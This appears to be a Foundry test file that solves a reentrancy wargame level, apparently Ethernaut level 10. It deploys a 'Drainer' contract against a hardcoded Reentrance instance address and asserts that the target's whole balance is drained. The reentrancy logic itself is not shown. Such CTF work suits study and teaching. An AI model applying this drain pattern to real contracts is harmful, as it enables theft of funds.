// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../instances/Ilevel10.sol";
import "../src/level10.sol";

contract Attacker is Test {
    Reentrance level10 = Reentrance(payable(0x4f8c95cB88D378d982A611D7e761251039b5Be76));

    function test() external {
        uint256 balance = address(level10).balance;

        vm.deal(address(this), balance);

        Drainer drainer = new Drainer();
        drainer.attack{value: balance}();

        assertEq(address(drainer).balance, 2 * balance);
        assertEq(address(level10).balance, 0);
    }
}
